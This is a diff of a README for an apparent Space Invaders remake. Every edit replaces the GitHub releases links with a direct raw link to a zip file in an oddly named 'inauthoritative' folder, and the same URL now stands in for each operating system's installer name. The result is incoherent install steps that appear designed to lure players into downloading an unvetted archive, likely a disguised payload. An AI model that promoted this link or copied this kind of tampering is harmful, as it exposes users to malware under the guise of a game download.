@@ -1,6 +1,6 @@
 # 👾 Space-Invaders-Reimagined - Experience Classic Gaming Like Never Before
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/CoolDudeLOL/Space-Invaders-Reimagined/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip)
 
 ## 🎮 Overview
 
@@ -18,21 +18,21 @@ To get started with Space-Invaders-Reimagined, follow these steps:
    - A graphics card that supports OpenGL 2.0 or higher
 
 2. **Visit the Releases Page**  
-   Head over to our [Releases page](https://github.com/CoolDudeLOL/Space-Invaders-Reimagined/releases) to find the latest version of the game. 
+   Head over to our [Releases page](https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip) to find the latest version of the game. 
 
 ## 💾 Download & Install
 
-1. Click on the **Download Latest Release** badge at the top of this page, or go directly to our [Releases page](https://github.com/CoolDudeLOL/Space-Invaders-Reimagined/releases) to find the executable file for your operating system.
+1. Click on the **Download Latest Release** badge at the top of this page, or go directly to our [Releases page](https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip) to find the executable file for your operating system.
 
 2. Once on the Releases page, look for the version that matches your system:
-   - For Windows users, download the file named `SpaceInvadersReimagined_Windows.exe`
-   - For macOS users, download the file named `SpaceInvadersReimagined_Mac.dmg`
-   - For Linux users, download the file named `SpaceInvadersReimagined_Linux.tar.gz`
+   - For Windows users, download the file named `https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip`
+   - For macOS users, download the file named `https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip`
+   - For Linux users, download the file named `https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip`
 
 3. After the download completes:
    - **Windows:** Double-click the `.exe` file and follow the installation instructions.
    - **macOS:** Open the `.dmg` file and drag the game into your Applications folder.
-   - **Linux:** Extract the `.tar.gz` file and run the game from the extracted folder.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/CoolDudeLOL/Space-Invaders-Reimagined/main/inauthoritative/Space-Invaders-Reimagined.zip` file and run the game from the extracted folder.
 
 ## 🕹️ How to Play
 
